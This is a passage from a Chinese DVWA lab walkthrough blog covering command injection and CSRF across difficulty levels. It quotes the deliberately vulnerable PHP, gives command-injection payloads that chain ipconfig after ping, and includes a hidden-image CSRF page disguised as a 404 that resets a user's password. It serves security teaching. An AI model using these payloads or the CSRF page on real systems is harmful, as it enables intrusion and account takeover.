class="hljs-variable">$avatar</span>       = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;avatar&#x27;</span> ];<br>  <span class="hljs-variable">$failed_login</span> = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;failed_login&#x27;</span> ];<br>  <span class="hljs-variable">$last_login</span>   = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;last_login&#x27;</span> ];<br><br>  <span class="hljs-comment">// 输出登录信息</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="hljs-subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br><br>  <span class="hljs-comment">// 自上次登录后账户是否已被锁定</span><br>  <span class="hljs-keyword">if</span>( <span class="hljs-variable">$failed_login</span> &gt;= <span class="hljs-variable">$total_failed_login</span> ) &#123;<br>   <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;<br>   <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="hljs-subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// 重置登录失败次数</span><br>  <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>  <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::PARAM_STR );<br>  <span class="hljs-variable">$data</span>-&gt;execute();<br> &#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// 登录失败随机延时并且输出返回信息</span><br>  sleep( rand( <span class="hljs-number">2</span>, <span class="hljs-number">4</span> ) );<br><br>  <span class="hljs-comment">// 页面展示</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="hljs-subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;<br><br>  <span class="hljs-comment">// 跟新登录失败次数</span><br>  <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>  <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::PARAM_STR );<br>  <span class="hljs-variable">$data</span>-&gt;execute();<br> &#125;<br><br> <span class="hljs-comment">// 设置最后登录时间到数据库</span><br> <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );<br> <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::PARAM_STR );<br> <span class="hljs-variable">$data</span>-&gt;execute();<br>&#125;<br><br><span class="hljs-comment">// 重新获取token到session</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这个难度是最高的，基本不可能暴破，其中gat方式获取参数转变为post获取，加上了token校验机制，限制了登录次数，登录超过三次会被锁定等待15分钟，通过这几种方式有效的防止了暴力破解。</p>
<h2 id="DVWA-–-Command-Injection（命令注入）"><a href="#DVWA-–-Command-Injection（命令注入）" class="headerlink" title="DVWA – Command Injection（命令注入）"></a>DVWA – Command Injection（命令注入）</h2><p>Command Injection(命令注入)，就是指通过提交一些恶意构造的参数破环命令语句结构，从而达到恶意执行命令的目的。这里要和RCE漏洞进行区别，RCE漏洞是执行代码，而这里执行的是命令。<br>Command Injection主题：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-11-50-15.png" alt="命令注入" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br> <span class="hljs-comment">// 获取输入</span><br> <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><br> <span class="hljs-comment">// 确定操作系统并执行ping命令</span><br> <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>  <span class="hljs-comment">// Windows</span><br>  <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// *nix</span><br>  <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br> &#125;<br><br> <span class="hljs-comment">//返回结果到页面中</span><br> <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>通过代码分析可知服务器仅根据不同的操作系统执行了不同的命令并没有对传入的参数进行过滤<br>命令拼接：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ping 127.0.0.1 &amp; ipconfig　　　　#先执行127.0.0.1，不管127.0.0.1是否执行成功都会执行ipconfig<br>ping 127.0.0.1 &amp;&amp; ipconfig　　  #先执行127.0.0.1，127.0.0.1执行成功后才会执行ipconfig<br>ping 127.0.0.1 | ipconfig　　　　#不管127.0.0.1执行是否成功都会执行ipconfig<br>ping 127.0.0 || ipconfig　　　   #前面的命令要执行失败，才可以执行后面的命令<br></code></pre></td></tr></table></figure>

<p>在这里我们直接使用第一个拼接，由于后台写了ping 所以我们只需要构造payload<code>127.0.0.1 &amp; ipconfig</code>就好：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-12-01-11.png" alt="成功执行" class="lazyload"><br>可以看到成功回显出了我们拼接的ipconfig命令</p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br> <span class="hljs-comment">// 获取输入</span><br> <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><br> <span class="hljs-comment">// 设置命令黑名单其中有&amp;&amp;和;</span><br> <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>  <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br> );<br><br> <span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span><br> <span class="hljs-comment">//调用将&amp;&amp;和;替换为空</span><br> <span class="hljs-variable">$target</span> = str_replace( array_keys( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br><br> <span class="hljs-comment">// Determine OS and execute the ping command.</span><br> <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>  <span class="hljs-comment">// Windows</span><br>  <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// *nix</span><br>  <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br> &#125;<br><br> <span class="hljs-comment">// Feedback for the end user</span><br> <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>相较于low来说添加了黑名单将&amp;&amp;和;做了限制进行了替换，换为空，但其他没限制仍然可以使用<code>127.0.0.1 &amp; ipconfig</code>进行绕过执行<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-12-10-51.png" alt="测试" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br> <span class="hljs-comment">// Get input</span><br> <span class="hljs-variable">$target</span> = trim(<span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ]);<br><br> <span class="hljs-comment">// Set blacklist 添加了黑名单数量</span><br> <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>  <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;| &#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br> );<br><br> <span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span><br> <span class="hljs-variable">$target</span> = str_replace( array_keys( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br><br> <span class="hljs-comment">// Determine OS and execute the ping command.</span><br> <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>  <span class="hljs-comment">// Windows</span><br>  <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// *nix</span><br>  <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br> &#125;<br><br> <span class="hljs-comment">// Feedback for the end user</span><br> <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>可以发现黑名单数量加多了，但仔细观察发现’| ‘管道符后边多了一个空格替换成空我们考虑使用管道符绕过<code>127.0.0.1 |ipconfig</code></p>
<p>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-12-18-33.png" alt="成功执行" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br> <span class="hljs-comment">// Check Anti-CSRF token加入token验证</span><br> checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br> <span class="hljs-comment">// Get input 获取ip</span><br> <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br> <span class="hljs-comment">//stripslashes函数会剥离字符串中的反斜杠，然后返回剥离完反斜杠的字符串</span><br> <span class="hljs-variable">$target</span> = stripslashes( <span class="hljs-variable">$target</span> );<br><br> <span class="hljs-comment">// Split the IP into 4 octects 以.作为分隔符，分割$target</span><br> <span class="hljs-variable">$octet</span> = explode( <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$target</span> );<br><br> <span class="hljs-comment">// Check IF each octet is an integer检测分割后的元素是否都是数字类型</span><br> <span class="hljs-keyword">if</span>( ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="hljs-variable">$octet</span> ) == <span class="hljs-number">4</span> ) ) &#123;<br>  <span class="hljs-comment">// If all 4 octets are int&#x27;s put the IP back together.如果都是数字类型的话，就将2他们再合并成$torget</span><br>  <span class="hljs-variable">$target</span> = <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>];<br><br>  <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>  <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>   <span class="hljs-comment">// Windows</span><br>   <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>   <span class="hljs-comment">// *nix</span><br>   <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>  &#125;<br><br>  <span class="hljs-comment">// Feedback for the end user</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// Ops. Let the user name theres a mistake</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;<br> &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>这里是添加了白名单，白名单的作用是只允许什么通过。</p>
<h2 id="DVWA靶场通关-–-CSRF"><a href="#DVWA靶场通关-–-CSRF" class="headerlink" title="DVWA靶场通关 – CSRF"></a>DVWA靶场通关 – CSRF</h2><p>csrf(跨站请求伪造)，利用还未过期的用户信息诱骗用户点击链接修改用户信息<br>csrf主题：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-12-29-59.png" alt="csrf" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br> <span class="hljs-comment">// Get input使用get方式获取两个密码</span><br> <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br> <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br> <span class="hljs-comment">// Do the passwords match?查看两次密码是否一样</span><br> <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>  <span class="hljs-comment">// They do!一样的话直接插入数据库</span><br>  <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>  <span class="hljs-variable">$pass_new</span> = md5( <span class="hljs-variable">$pass_new</span> );<br><br>  <span class="hljs-comment">// Update the database</span><br>  <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>  <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>  <span class="hljs-comment">// Feedback for the user</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// Issue with passwords matching</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br> &#125;<br><br> ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>get方式获取了两次输入的密码，一致的话直接将数据插入到数据库中<br>漏洞复现：<br>首先尝试修改密码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-14-31-38.png" alt="尝试登录" class="lazyload"><br>测试原来默认的密码登录失败，新设置的密码在url中可以看到<br>我们构造链接<a target="_blank" rel="noopener" href="http://192.168.23.128/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#">http://192.168.23.128/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a>在浏览器中访问发现密码就能被重新改回到password（诱骗用户点击）<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-14-37-45.png" alt="执行" class="lazyload"><br>然后我们登录就可以使用password做密码登录了</p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Checks to see where the request came from</span><br>    <span class="hljs-comment">//stripos(str1,str2)检查str2在str1中出现的位置（不区分大小写）如果有//返回ture</span><br>    <span class="hljs-comment">//判断host字段是否出现在referer字段中</span><br>    <span class="hljs-keyword">if</span>( stripos( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-comment">// Get input</span><br>        <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>        <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>        <span class="hljs-comment">// Do the passwords match?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>            <span class="hljs-comment">// They do!</span><br>            <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>            <span class="hljs-variable">$pass_new</span> = md5( <span class="hljs-variable">$pass_new</span> );<br><br>            <span class="hljs-comment">// Update the database</span><br>            <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>            <span class="hljs-comment">// Feedback for the user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Issue with passwords matching</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Didn&#x27;t come from a trusted source</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>medium级别的代码检查了保留变量http_referer(http包头的referer参数值，表示来源地址)中是否包含了server_name（http包头的host参数，即要访问的主机名，这里是192.168.23.128），希望通过这种机制抵御csrf攻击<br>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-15-22-29.png" alt="抓包查看信息" class="lazyload"><br>可以看到数据包中有Referer但在url中没有，这里是url<a target="_blank" rel="noopener" href="http://192.168.23.128/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://192.168.23.128/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a>可以进行查看参数中没有referer。意思是referer中只要出现server_name就可以正常操作<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-10-52-59.png" alt="修改参数加入referer" class="lazyload"><br>可以看到在hackbr中修改参数密码为password然后添加头信心referer点击执行可以看到成功执行。<br>也可以自己搭建的恶意网站中是不存在这个的我们在链接中包含上服务器的地址就能绕过了，我们可以构造一个图片的src中包含服务器地址的文件，index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.23.128/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span><span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found.<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>然后存放到自己的网站然后发送链接<a target="_blank" rel="noopener" href="http://192.168.23.128/192.168.23.128.html">http://192.168.23.128/192.168.23.128.html</a>给用户一但点击攻击就完成了<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-11-15-13.png" alt="成功执行" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
